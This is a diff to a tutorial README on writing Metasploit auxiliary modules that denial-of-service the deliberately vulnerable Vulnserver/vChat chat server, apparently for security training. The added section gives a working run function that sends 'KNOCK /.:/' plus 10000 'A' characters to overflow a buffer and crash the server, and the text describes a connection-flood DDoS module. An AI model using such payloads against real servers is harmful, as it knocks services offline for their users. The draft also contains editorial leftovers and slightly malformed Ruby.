@@ -1,5 +1,5 @@
 # Making-Dos-Metasploit-Module-Vulnserver
-This is a walkthrough of making the DOS Metasploit module for Vulnserver a vulnerable chat server. 
+This is a walkthrough of making the DoS Metasploit module for Vulnserver a vulnerable chat server. 
 ## Table of Contents 
 * [Introduction](#introduction)
     * [Different types of Modules](#different-types-of-modules)
@@ -14,9 +14,9 @@ The first thing that you should know is what the different kinds of modules are,
 
 
 ### Different types of Modules 
-There are different types of modules. They and their characteristics are listed below. The two main modules we are concerned with are the Auxiliary and Exploit modules. This is because in our case we want to make both a DOS/DDOS and Exploit module for the vChat server. 
+There are different types of modules. They and their characteristics are listed below. The two main modules we are concerned with are the Auxiliary and Exploit modules. This is because in our case we want to make both a DoS/DDOS and Exploit module for the vChat server. 
 
-In the cases of our Exploit we are going to want to include a payload to gain further access to the system, so it should be an Msf::Exploit class of module. Then in the case of our DOS/DDOS module we would want it to be a Msf:Auxillary class of module as no payload is going to be used or needed.
+In the cases of our Exploit we are going to want to include a payload to gain further access to the system, so it should be an Msf::Exploit class of module. Then in the case of our DOS/DDoS module we would want it to be a Msf:Auxillary class of module as no payload is going to be used or needed.
 
 1. **Exploit Modules**
     * They Executes a sequence of commands to target a specific vulnerability found in a system or application. 
@@ -78,13 +78,13 @@ class MetasploitModule < Msf::Exploit
 #### Mixins
 Mixins are an important concept in Ruby and the Metasploit Framework. They are modules that are included inside of a class. They expand the functionality of the class with that of the module. The main thing we are concerned with in the Metasploit framework are the **Datastore** objects and functions they provide.
 
-When creating the DOS, DDOS and Exploit modules all will use the **Msf::Exploit::Remote::Tcp** Mixin. If the module is a DOS or DDOS module it will also include the **Msf::Auxillary::Dos** module. 
+When creating the DoS, DDoS and Exploit modules all will use the **Msf::Exploit::Remote::Tcp** Mixin. If the module is a DOS or DDOS module it will also include the **Msf::Auxillary::Dos** module. 
 
 The [**Msf::Exploit::Remote::Tcp**](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Exploit/Remote/Tcp) Mixin will provide us with necessary TCP/IP functions to interact with  remote servers, and **Datastore** objects to control that. 
 
 *Note that it is possible to implement this using standard Ruby TCP/IP libraries and functions.* ***REmove Space between this and above later***
 
-The [**Msf::Auxillary::Dos**](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Auxiliary/Dos) provides DOS functionalities to the module, along with identifying the Auxiliary module specifically as a DOS module.
+The [**Msf::Auxillary::Dos**](https://www.rubydoc.info/github/rapid7/metasploit-framework/Msf/Auxiliary/Dos) provides DOS functionalities to the module, along with identifying the Auxiliary module specifically as a DoS module.
 
 So we will have the following Module
 ```ruby
@@ -140,7 +140,7 @@ There are many other attributes that can be used, if you want to see an alternat
 
 What we get from filling out that information in the **super(update_info(info, ...)** is the following.
 
-In the case of the DOS/DDOS module
+In the case of the DoS/DDoS module
 ```ruby
 class MetasploitModule < Msf::Auxiliary	
   Rank = NormalRanking	
@@ -311,7 +311,7 @@ class MetasploitModule < Msf::Auxiliary
       ])
   end
 ```
-#### DDos
+#### DDoS
 
 This module is meant to create a certain number of connections to the vulnserver and this number is defined by the user. This is done to clog the vChat vulnserver and prevent other *normal* users from connecting. We do not use the **Msf::Exploit::Remote::Tcp** Mixin because the **connect** function it provides will timeout the connection. We use Ruby's socket library to get the same functionality while also defining a *RPORT* and *RHOST* datastore option to use the same conventions as modules that use the **Msf::Exploit::Remote::Tcp** Mixin.   
 
@@ -345,6 +345,49 @@ def initialize(info = {})
         ])
     end
 ```
+### Running the Auxiliary Module
+This section will be on defining the function that will run the **Msf::Auxillary** module in the Metasploit console or Arimitage application. This will be in general what the function definition looks like, and the specific cases for both the DoS and DDoS modules.
+
+#### Msf::Auxillary
+The **Msf::Auxillary** modules define a function *run*, this is where the executed code, and is the equivalent of a *main* function in C, C++ or Java. ***This is a comparison*** The body of the *run* function will contain normal Ruby code.
+
+You can define additional function that the *run* function calls and interacts with, but we use the *run* function as the entrypoint of the program when executing the module.
+
+The *run* function will look something like:
+```ruby
+def run
+    ...
+    ...
+    # Normal Ruby code
+    ...
+    ...
+end
+```
+#### DoS Module
+The DoS module that is contained in the repository contains additional code to describe and show what is happening. The following will show a minimal definition of the *run* function for the DoS module.
+
+The purpose of the DoS module is to send a specially crafted message which will exploit a buffer overflow  to crash the chat server. We will need to do the following.
+1. Connect to the server.
+1. Generate the malicious message.
+1. Send the malicious message to the server.
+*we can optionally disconnect from the server, this would only have effect if the server does not crash*
+
+With those requirements in mind we will create the following *run* function.
+
+```ruby 
+def run
+    connect # This is a function from the Msf::Exploit::Remote:Tcp Mixin that connect to the RHOST, on RPORT
+    outbound = "KNOCK /.:/" + "A"*10000 # Create outbound message
+    sock.put(outbound) # sends message to target
+
+    ensure # Ensures the exploit disconnects from the server
+        disconnect
+    end
+end
+```
+
+
+
 
 
 ## References
